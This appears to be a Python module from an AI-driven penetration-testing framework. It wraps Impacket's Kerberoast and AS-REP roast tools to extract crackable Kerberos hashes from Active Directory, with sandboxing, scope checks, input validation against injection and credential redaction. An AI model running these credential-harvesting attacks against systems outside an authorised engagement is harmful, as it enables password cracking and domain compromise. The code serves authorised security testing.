"""Impacket adapters: GetUserSPNs (Kerberoast), GetNPUsers (AS-REP roast).

Both are LDAP-bind enumeration tools that produce crackable hashes for
offline cracking. They are read-only on AD (no auth state is mutated) but
DO require valid domain credentials (Kerberoast) or just the domain name
(AS-REP if accounts have DONT_REQUIRE_PREAUTH set).

Risk class: ENUM. The retrieved hashes ARE crackable, so the output is
sensitive — `EvidenceStore.put` scrubs them via the existing patterns
(handles `$krb5tgs$` and `$krb5asrep$` prefixes via the broader
`secret|token|hash` regex; defense-in-depth, not relied on).
"""

from __future__ import annotations

import ipaddress
import re
from typing import ClassVar
from uuid import UUID

from pydantic import BaseModel, Field, field_validator

from orchestrator.evidence import EvidenceStore
from sandbox.network import engagement_network_name
from sandbox.runner import SandboxRunner
from tools._helpers import iso
from tools.base import Tool, ToolResult, ToolRunContext
from worldstate.schema import RiskClass, Stage

# Mirror the FQDN / username regexes used in tools/bloodhound_.py — same
# validation surface for the same operator-controlled fields. ASRepRoast in
# particular previously interpolated ``input.domain`` and ``input.dc_ip``
# directly into ``/bin/sh -c``; the validators are the first line of defence
# and the env-var argv path below is the second.
_FQDN_RE = re.compile(
    r"^(?=[a-zA-Z])(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)*"
    r"[a-zA-Z]{2,63}$"
)
# NOTE: ``@`` is deliberately EXCLUDED. The username is concatenated into the
# impacket token ``domain/user:password@dc-ip`` which impacket parses
# left-to-right on ``@``/``:``/``/``; an ``@`` in the username terminates the
# host segment early and re-routes the bind to an out-of-scope host (the scope
# gate only checked ``dc_ip``). ``:`` and ``/`` are excluded for the same
# reason.
_USERNAME_RE = re.compile(r"^[A-Za-z0-9._\-$]{1,256}$")


def _validate_fqdn(v: str) -> str:
    if not _FQDN_RE.match(v):
        raise ValueError(
            f"domain must be a valid FQDN or hostname, got {v!r}"
        )
    return v


def _validate_ip(v: str) -> str:
    try:
        ipaddress.ip_address(v)
    except ValueError as e:
        raise ValueError(f"dc_ip must be a valid IPv4/IPv6 address: {e}") from e
    return v


def _validate_username(v: str) -> str:
    if not _USERNAME_RE.match(v):
        raise ValueError(
            "username contains disallowed characters; only letters, digits, "
            "and ._-$@ are permitted"
        )
    return v


class KerberoastInput(BaseModel):
    domain: str = Field(min_length=1, description="Fully-qualified domain, e.g. 'lab.local'")
    dc_ip: str = Field(min_length=1, description="Domain controller IP")
    username: str = Field(min_length=1)
    password: str | None = None
    nt_hash: str | None = Field(default=None, pattern=r"^[a-fA-F0-9]{32}$")
    request_user: str | None = Field(
        default=None,
        description="Optional: request the TGS for one specific user instead of all",
    )

    @field_validator("domain")
    @classmethod
    def _check_domain(cls, v: str) -> str:
        return _validate_fqdn(v)

    @field_validator("dc_ip")
    @classmethod
    def _check_dc_ip(cls, v: str) -> str:
        return _validate_ip(v)

    @field_validator("username")
    @classmethod
    def _check_username(cls, v: str) -> str:
        return _validate_username(v)

    @field_validator("password")
    @classmethod
    def _check_password(cls, v: str | None) -> str | None:
        # GetUserSPNs.py parses the single token ``domain/user:password@dc-ip``
        # left-to-right on ``/``, ``:``, ``@``. If the operator-supplied password
        # contains any of those characters, impacket's auth parser silently
        # mis-routes the credential to a different host (out-of-scope target)
        # or treats the trailing segment as the hostname. Also NUL/newline
        # break the redacted-argv log line. Mirror the BloodHound password
        # validator AND additionally forbid the three impacket-syntax tokens.
        if v is None:
            return v
        if "\x00" in v or "\n" in v or "\r" in v:
            raise ValueError("password must not contain NUL or newline characters")
        for bad in ("@", ":"):
            if bad in v:
                raise ValueError(
                    f"password must not contain {bad!r} (impacket parses "
                    "domain/user:password@dc-ip left-to-right on those tokens; "
                    "an embedded one would mis-route the credential)"
                )
        return v

    @field_validator("request_user")
    @classmethod
    def _check_request_user(cls, v: str | None) -> str | None:
        return _validate_username(v) if v else v


class KerberoastTicket(BaseModel):
    spn: str
    sam_name: str
    hash_format: str  # "krb5tgs"
    truncated_hash_preview: str  # first 60 chars, for UI display


class KerberoastOutput(BaseModel):
    tickets: list[KerberoastTicket] = Field(default_factory=list)
    raw_stdout_blob_id: str | None = None
    command: str


class ASRepRoastInput(BaseModel):
    domain: str = Field(min_length=1)
    dc_ip: str = Field(min_length=1)
    users_file_content: str = Field(
        min_length=1,
        max_length=200_000,
        description="Newline-separated usernames to test (file contents)",
    )

    @field_validator("domain")
    @classmethod
    def _check_domain(cls, v: str) -> str:
        return _validate_fqdn(v)

    @field_validator("dc_ip")
    @classmethod
    def _check_dc_ip(cls, v: str) -> str:
        return _validate_ip(v)


class ASRepHash(BaseModel):
    sam_name: str
    hash_format: str  # "krb5asrep"
    truncated_hash_preview: str


class ASRepRoastOutput(BaseModel):
    hashes: list[ASRepHash] = Field(default_factory=list)
    raw_stdout_blob_id: str | None = None
    command: str


def _build_executor():
    from orchestrator.settings import get_settings
    from tools._helpers import ToolExecutor

    settings = get_settings()
    try:
        evidence = EvidenceStore(settings)
    except Exception:
        evidence = None  # type: ignore[assignment]
    return ToolExecutor(SandboxRunner(), evidence)


class ImpacketKerberoast(Tool[KerberoastInput, KerberoastOutput]):
    name = "impacket_kerberoast"
    description = (
        "Request TGS for every Kerberoastable service account in the domain "
        "(those with an SPN set). Returns krb5tgs hashes for offline cracking. "
        "Requires valid domain credentials (any user — no admin needed)."
    )
    stage = Stage.ENUMERATION
    risk_class = RiskClass.ENUM
    Input: ClassVar[type[BaseModel]] = KerberoastInput
    Output: ClassVar[type[BaseModel]] = KerberoastOutput

    def extract_targets(self, input: KerberoastInput) -> list[str]:
        return [input.dc_ip]

    def summarize_for_model(
        self, output: KerberoastOutput, *, tool_run_id: UUID, persisted: int
    ) -> str:
        spns = ", ".join(
            f"{t.sam_name}({t.spn[:40]})" for t in output.tickets[:3]
        ) or "none"
        summary = (
            f"{self.name}: {len(output.tickets)} krb5tgs tickets. "
            f"top: {spns}. persisted={persisted}. tool_run_id={tool_run_id}"
        )
        if len(summary) > 500:
            summary = summary[:485] + "... [truncated]"
        return summary

    async def run(
        self, input: KerberoastInput, ctx: ToolRunContext
    ) -> ToolResult[KerberoastOutput]:
        # Impacket's GetUserSPNs.py syntax: domain/user[:password]@dc-ip
        auth = f"{input.domain}/{input.username}"
        if input.password:
            auth_arg = f"{auth}:{input.password}@{input.dc_ip}"
            redacted_auth_arg = f"{auth}:***REDACTED***@{input.dc_ip}"
        elif input.nt_hash:
            auth_arg = f"{auth}@{input.dc_ip}"
            redacted_auth_arg = auth_arg
        else:
            auth_arg = f"{auth}@{input.dc_ip}"
            redacted_auth_arg = auth_arg

        argv = ["GetUserSPNs.py", "-request", "-dc-ip", input.dc_ip, auth_arg]
        redacted = ["GetUserSPNs.py", "-request", "-dc-ip", input.dc_ip, redacted_auth_arg]
        if input.nt_hash:
            argv += ["-hashes", f":{input.nt_hash}"]
            redacted += ["-hashes", ":***REDACTED-NT-HASH***"]
        if input.request_user:
            argv += ["-request-user", input.request_user]
            redacted += ["-request-user", input.request_user]
        argv += ["-no-pass"] if input.nt_hash else []
        redacted += ["-no-pass"] if input.nt_hash else []

        executor = _build_executor()
        # Mirror ToolExecutor.run_and_capture (canonical pattern in
        # _helpers.py): bind BOTH engagement_id AND default_network. Setting
        # engagement_id alone leaves default_network=None and the spawned
        # container falls onto Docker's default bridge, losing the
        # per-engagement L2 isolation ARCHITECTURE §7 promises.
        executor.sandbox.engagement_id = str(ctx.engagement_id)
        executor.sandbox.default_network = engagement_network_name(ctx.engagement_id)
        result = await executor.sandbox.run(
            argv, timeout_seconds=ctx.timeout_seconds, redacted_argv=redacted
        )
        stdout_id: str | None = None
        if executor.evidence and result.stdout:
            blob_id, _ = executor.evidence.put(
                result.stdout, engagement_id=ctx.engagement_id, kind=f"{self.name}/stdout"
            )
            stdout_id = str(blob_id)
        tickets = _parse_kerberoast(result.stdout.decode("utf-8", errors="replace"))
        return ToolResult(
            tool_run_id=ctx.tool_run_id,
            name=self.name,
            output=KerberoastOutput(
                tickets=tickets,
                raw_stdout_blob_id=stdout_id,
                command=" ".join(redacted),
            ),
            raw_stdout_blob_id=UUID(stdout_id) if stdout_id else None,
            exit_code=result.exit_code,
            started_at=iso(result.started_at),
            ended_at=iso(result.ended_at),
        )


class ImpacketASRepRoast(Tool[ASRepRoastInput, ASRepRoastOutput]):
    name = "impacket_asreproast"
    description = (
        "AS-REP roast: for users with `DONT_REQUIRE_PREAUTH` set, request an "
        "AS-REP and extract the krb5asrep hash for offline cracking. No "
        "credentials required — just a username list and the DC."
    )
    stage = Stage.ENUMERATION
    risk_class = RiskClass.ENUM
    Input: ClassVar[type[BaseModel]] = ASRepRoastInput
    Output: ClassVar[type[BaseModel]] = ASRepRoastOutput

    def extract_targets(self, input: ASRepRoastInput) -> list[str]:
        return [input.dc_ip]

    def summarize_for_model(
        self, output: ASRepRoastOutput, *, tool_run_id: UUID, persisted: int
    ) -> str:
        sams = ", ".join(h.sam_name for h in output.hashes[:5]) or "none"
        summary = (
            f"{self.name}: {len(output.hashes)} AS-REP-roastable users. "
            f"users: {sams}. persisted={persisted}. tool_run_id={tool_run_id}"
        )
        if len(summary) > 500:
            summary = summary[:485] + "... [truncated]"
        return summary

    async def run(
        self, input: ASRepRoastInput, ctx: ToolRunContext
    ) -> ToolResult[ASRepRoastOutput]:
        # Operator-controlled fields (domain, dc_ip) flow through *environment
        # variables*, NEVER interpolated into the shell command string. The
        # wrapper script references them as "$ASREP_DOMAIN" etc., so
        # GetNPUsers.py receives them as bare argv tokens via the shell's
        # argv expansion — not as parsed shell text. The Pydantic field
        # validators are the first line of defence; the env-var boundary
        # below is the second.
        #
        # ``users_file_content`` is operator-supplied but never lands in
        # the shell parser — it's base64-encoded (which only emits a small
        # alphabet of ASCII chars) and decoded back inside the sandbox.
        import base64

        users_path = f"/tmp/asrep-users-{ctx.tool_run_id}.txt"
        b64 = base64.b64encode(input.users_file_content.encode("utf-8")).decode("ascii")
        wrapper = (
            'set -e; '
            'echo "$ASREP_USERS_B64" | base64 -d > "$ASREP_USERS_PATH"; '
            'GetNPUsers.py "$ASREP_DOMAIN/" -dc-ip "$ASREP_DC_IP" '
            '-usersfile "$ASREP_USERS_PATH" -format hashcat -no-pass'
        )
        env: dict[str, str] = {
            "ASREP_DOMAIN": input.domain,
            "ASREP_DC_IP": input.dc_ip,
            "ASREP_USERS_PATH": users_path,
            "ASREP_USERS_B64": b64,
        }
        argv = ["/bin/sh", "-c", wrapper]
        # Redacted argv for logging: surfaces the operator-visible (non-secret)
        # bits as a stable command line. The user list is opaque (base64) —
        # no secrets to redact at this layer; per-row secrets in the JSON
        # output are scrubbed by EvidenceStore.put.
        red_cmd = (
            f"GetNPUsers.py {input.domain}/ -dc-ip {input.dc_ip} "
            f"-usersfile {users_path} -format hashcat -no-pass"
        )
        redacted = ["/bin/sh", "-c", red_cmd]

        executor = _build_executor()
        # Mirror ToolExecutor.run_and_capture (canonical pattern in
        # _helpers.py): bind BOTH engagement_id AND default_network. Setting
        # engagement_id alone leaves default_network=None and the spawned
        # container falls onto Docker's default bridge, losing the
        # per-engagement L2 isolation ARCHITECTURE §7 promises.
        executor.sandbox.engagement_id = str(ctx.engagement_id)
        executor.sandbox.default_network = engagement_network_name(ctx.engagement_id)
        result = await executor.sandbox.run(
            argv,
            timeout_seconds=ctx.timeout_seconds,
            redacted_argv=redacted,
            env=env,
        )
        stdout_id: str | None = None
        if executor.evidence and result.stdout:
            blob_id, _ = executor.evidence.put(
                result.stdout, engagement_id=ctx.engagement_id, kind=f"{self.name}/stdout"
            )
            stdout_id = str(blob_id)
        hashes = _parse_asrep(result.stdout.decode("utf-8", errors="replace"))
        return ToolResult(
            tool_run_id=ctx.tool_run_id,
            name=self.name,
            output=ASRepRoastOutput(
                hashes=hashes,
                raw_stdout_blob_id=stdout_id,
                command=f"GetNPUsers.py {input.domain}/ -dc-ip {input.dc_ip} -usersfile <stdin> -format hashcat -no-pass",
            ),
            raw_stdout_blob_id=UUID(stdout_id) if stdout_id else None,
            exit_code=result.exit_code,
            started_at=iso(result.started_at),
            ended_at=iso(result.ended_at),
        )


# Impacket outputs hashes in one of two recognizable formats:
#   $krb5tgs$23$*<sam>$<realm>$<spn>*$... (Kerberoast / GetUserSPNs)
#   $krb5asrep$23$<sam>@<realm>:... (GetNPUsers --format hashcat)
_KRB5TGS = re.compile(
    r"^\$krb5tgs\$(?P<etype>\d+)\$"
    r"\*(?P<sam>[^$]+)\$(?P<realm>[^$]+)\$(?P<spn>[^*]+)\*",
    re.MULTILINE,
)
_KRB5ASREP = re.compile(
    r"^\$krb5asrep\$(?P<etype>\d+)\$(?P<sam>[^@]+)@(?P<realm>[^:]+):",
    re.MULTILINE,
)


def _parse_kerberoast(text: str) -> list[KerberoastTicket]:
    out: list[KerberoastTicket] = []
    for m in _KRB5TGS.finditer(text):
        preview = text[m.start() : m.start() + 60]
        out.append(
            KerberoastTicket(
                spn=m.group("spn"),
                sam_name=m.group("sam"),
                hash_format="krb5tgs",
                truncated_hash_preview=preview,
            )
        )
    return out


def _parse_asrep(text: str) -> list[ASRepHash]:
    out: list[ASRepHash] = []
    for m in _KRB5ASREP.finditer(text):
        preview = text[m.start() : m.start() + 60]
        out.append(
            ASRepHash(
                sam_name=m.group("sam"),
                hash_format="krb5asrep",
                truncated_hash_preview=preview,
            )
        )
    return out
